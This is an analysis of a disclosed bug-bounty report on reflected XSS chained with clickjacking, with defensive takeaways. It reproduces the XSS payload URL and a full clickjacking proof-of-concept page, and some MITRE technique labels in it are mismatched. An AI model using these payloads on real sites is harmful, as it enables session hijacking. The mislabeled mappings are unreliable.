# Reflected XSS via Clickjacking on Query Parameter URL Injection

## Metadata
- **Source:** HackerOne
- **Report:** 1149144 | https://hackerone.com/reports/1149144
- **Submitted:** 2021-04-05
- **Reporter:** nagli
- **Program:** HackerOne Report #1149144
- **Bounty:** Not disclosed in report
- **Severity:** High
- **Vuln:** Reflected Cross-Site Scripting (XSS), Clickjacking, Server-Side Request Forgery (SSRF), Improper Input Validation
- **CVEs:** None
- **Category:** web-api

## Summary
A reflected XSS vulnerability exists in a query parameter that accepts user-controlled URLs. The application fetches the specified URL via XMLHttpRequest and renders the response path in the DOM without sanitization, allowing HTML/JavaScript injection. The researcher chained this with clickjacking to bypass CSRF protections and execute arbitrary JavaScript in victim context.

## Attack scenario
1. Attacker crafts a malicious URL containing XSS payload in the query parameter: url=http://attacker.com/<img src=x onerror=alert(1)>
2. Attacker creates a clickjacking page overlaying the vulnerable endpoint with an invisible iframe containing the malicious URL
3. Victim visits the attacker-controlled page and is prompted to click a decoy button
4. Victim's click is redirected to the hidden iframe, triggering the application to fetch the attacker's domain
5. Application renders the injected HTML/JavaScript payload from the response path
6. Victim's browser executes the JavaScript payload with access to session cookies and application context

## Root cause
The application fails to sanitize user-supplied URL parameters before inserting them into the DOM. The XMLHttpRequest response handling does not decode or validate the URL path before rendering, allowing arbitrary HTML injection. Additionally, missing clickjacking protections (X-Frame-Options, CSP frame-ancestors) permit framing of the vulnerable page.

## Attacker mindset
The researcher identified that direct CSRF was mitigated by XMLHttpRequest same-origin policy, but recognized clickjacking as a bypass mechanism. The attack demonstrates sophisticated chaining of multiple weaknesses: accepting arbitrary URLs, insufficient output encoding, and missing framing defenses. This shows understanding of defense evasion and multi-stage exploitation.

## Defensive takeaways
- Implement strict input validation on URL parameters using URL parsing libraries; whitelist allowed domains/protocols
- Apply HTML entity encoding to all user-controlled data before rendering in DOM context
- Implement Content Security Policy (CSP) with frame-ancestors directive and X-Frame-Options: DENY/SAMEORIGIN headers
- Use DOMPurify or similar libraries to sanitize any user-supplied content before DOM insertion
- Validate and sanitize XMLHttpRequest response content; avoid rendering untrusted data directly
- Implement anti-clickjacking measures including visual feedback, frame-busting code, and SameSite cookie attributes
- Apply defense-in-depth: combine output encoding, CSP, and framing protections

## Variant hunting
Search for other endpoints accepting URL parameters; test any fetched content rendering. Look for similar patterns with fetch(), jQuery $.ajax(), or other HTTP APIs. Test parameter names like: url, redirect, callback, origin, target, link, resource, endpoint. Check for SSRF variants where attacker can request internal services. Test if other query parameters share the same injection point.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing - Generic Phishing
- T1566 - Phishing
- T1056 - Input Capture
- T1185 - Traffic Duplication
- T1539 - Steal Web Session Cookie

## Notes
The researcher mentions an additional SSRF vulnerability to be reported separately, indicating the application performs unvalidated server-side requests. The use of XMLHttpRequest with user-controlled URLs creates both XSS and SSRF risks. The clickjacking PoC uses data: URI encoding and base64 to obfuscate the iframe content. This is a well-chained vulnerability report demonstrating multiple security bypasses.

## Full report
<details><summary>Expand</summary>

**Description:**
I'm able to control the url being inserted into the query line at

```
https://█████/████&url=http%3a%2f%2fgalnagli.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E
```

The server issues a request (there is also SSRF here I'll report later) to the domain specified, and it renders the path being entered, so when supplying as a path:

```
<img src=x onerror=alert(1)>
```

it will pop alert execution

as the request is being done with XMLHTTPRequest I couldn't make it CSRF, so I chained it with clickjacking.

███

## Best Regards
nagli

## Impact

Executing javascript on the victims behalf.

## System Host(s)
███████

## Affected Product(s) and Version(s)
██████████

## CVE Numbers


## Steps to Reproduce
Host the following HTML page, and make a click.

```

<div id="container" style="clip-path:none;clip:auto;overflow:visible;position:absolute;left:0;top:0;width:100%;height:100%">
<!-- Clickjacking PoC Generated by Burp Suite Professional -->
<input id="clickjack_focus" style="opacity:0;position:absolute;left:-5000px;">
<div id="clickjack_button" style="opacity: 1; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 64px; height: 21px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;"><div style="position:relative;top: 50%;transform: translateY(-50%);">Click</div></div>
<!-- Show this element when clickjacking is complete -->
<div id="clickjack_complete" style="display: none; transform-style: preserve-3d; font-family: Arial; font-size: 16pt; color: red; text-align: center; width: 100%; height: 100%;"><div style="position:relative;top: 50%;transform: translateY(-50%);">You've been clickjacked!</div></div>
<iframe id="parentFrame" src="data:text/html;base64,████████" frameborder="0" scrolling="no" style="-ms-transform: scale(1.0);-ms-transform-origin: 200px 200px;transform: scale(1.0);-moz-transform: scale(1.0);-moz-transform-origin: 200px 200px;-o-transform: scale(1.0);-o-transform-origin: 200px 200px;-webkit-transform: scale(1.0);-webkit-transform-origin: 200px 200px;opacity:0.5;border:0;position:absolute;z-index:1;width:1905px;height:984px;left:0px;top:0px"></iframe>
</div>
<script>function findPos(obj) {
	    var left = 0, top = 0;
	    if(obj.offsetParent) {
	        while(1) {
	          left += obj.offsetLeft;
	          top += obj.offsetTop;
	          if(!obj.offsetParent) {
	            break;
	          }
	          obj = obj.offsetParent;
	        }
	    } else if(obj.x && obj.y) {
	        left += obj.x;
	        top += obj.y;
	    }
	    return [left,top];
  	}function generateClickArea(pos) {
			var elementWidth, elementHeight, x, y, parentFrame = document.getElementById('parentFrame'), desiredX = 200, desiredY = 200, parentOffsetWidth, parentOffsetHeight, docWidth, docHeight,
				btn = document.getElementById('clickjack_button');
			if(pos < window.clickbandit.config.clickTracking.length) {
				clickjackCompleted(false);
				elementWidth = window.clickbandit.config.clickTracking[pos].width;
				elementHeight = window.clickbandit.config.clickTracking[pos].height;
				btn.style.width = elementWidth + 'px';
				btn.style.height = elementHeight + 'px';
				window.clickbandit.elementWidth = elementWidth;
				window.clickbandit.elementHeight = elementHeight;
				x = window.clickbandit.config.clickTracking[pos].left;
				y = window.clickbandit.config.clickTracking[pos].top;
				docWidth = window.clickbandit.config.clickTracking[pos].documentWidth;
				docHeight = window.clickbandit.config.clickTracking[pos].documentHeight;
				parentOffsetWidth = desiredX - x;
				parentOffsetHeight = desiredY - y;
				parentFrame.style.width = docWidth+'px';
				parentFrame.style.height = docHeight+'px';
				parentFrame.contentWindow.postMessage(JSON.stringify({clickbandit: 1, docWidth: docWidth, docHeight: docHeight, left: parentOffsetWidth, top: parentOffsetHeight}),'*');
				calculateButtonSize(getFactor(parentFrame));
				showButton();
				if(parentFrame.style.opacity === '0') {
					calculateClip();
				}
			} else {
				resetClip();
				hideButton();
				clickjackCompleted(true);
			}
		}function hideButton() {
			var btn = document.getElementById('clickjack_button');
			btn.style.opacity = 0;
		}function showButton() {
			var btn = document.getElementById('clickjack_button');
			btn.style.opacity = 1;
		}function clickjackCompleted(show) {
			var complete = document.getElementById('clickjack_complete');
			if(show) {
				complete.style.display = 'block';
			} else {
				complete.style.display = 'none';
			}
		}window.addEventListener("message", function handleMessages(e){
			var data;
			try {
				data = JSON.parse(e.data);
			} catch(e){
				data = {};
			}
			if(!data.clickbandit) {
				return false;
			}
			showButton();
		},false);window.addEventListener("blur", function(){ if(window.clickbandit.mouseover) { hideButton();setTimeout(function(){ generateClickArea(++window.clickbandit.config.currentPosition);document.getElementById("clickjack_focus").focus();},1000); } }, false);document.getElementById("parentFrame").addEventListener("mouseover",function(){ window.clickbandit.mouseover = true; }, false);document.getElementById("parentFrame").addEventListener("mouseout",function(){ window.clickbandit.mouseover = false; }, false);</script><script>window.clickbandit={mode: "review", mouseover:false,elementWidth:64,elementHeight:21,config:{"clickTracking":[{"width":64,"height":21,"mouseX":955,"mouseY":258,"left":921,"top":246,"documentWidth":1905,"documentHeight":984}],"currentPosition":0}};function calculateClip() {
			var btn = document.getElementById('clickjack_button'), w = btn.offsetWidth, h = btn.offsetHeight, container = document.getElementById('container'), x = btn.offsetLeft, y = btn.offsetTop;
			container.style.overflow = 'hidden';
			container.style.clip = 'rect('+y+'px, '+(x+w)+'px, '+(y+h)+'px, '+x+'px)';
			container.style.clipPath = 'inset('+y+'px '+(x+w)+'px '+(y+h)+'px '+x+'px)';
		}function calculateButtonSize(factor) {
			var btn = document.getElementById('clickjack_button'), resizedWidth = Math.round(window.clickbandit.elementWidth * factor), resizedHeight = Math.round(window.clickbandit.elementHeight * factor);
			btn.style.width = resizedWidth + 'px';
			btn.style.height = resizedHeight + 'px';
			if(factor > 100) {
				btn.style.fontSize = '400%';
			} else {
				btn.style.fontSize = (factor * 100) + '%';
			}
		}function resetClip() {
			var container = document.getElementById('container');
			container.style.overflow = 'visible';
			container.style.clip = 'auto';
			container.style.clipPath = 'none';
		}function getFactor(obj) {
			if(typeof obj.style.transform === 'string') {
				return obj.style.transform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.msTransform === 'string') {
				return obj.style.msTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.MozTransform === 'string') {
				return obj.style.MozTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.oTransform === 'string') {
				return obj.style.oTransform.replace(/[^\d.]/g,'');
			}
			if(typeof obj.style.webkitTransform === 'string') {
				return obj.style.webkitTransform.replace(/[^\d.]/g,'');
			}
			return 1;
		}</script>
```

## Suggested Mitigation/Remediation Actions
Sanitize the input being presented from the software.

It might be open one so ill ask for your help to issue CVE if thats the case :-)



</details>

---
*Analysed by Claude on 2026-05-24*
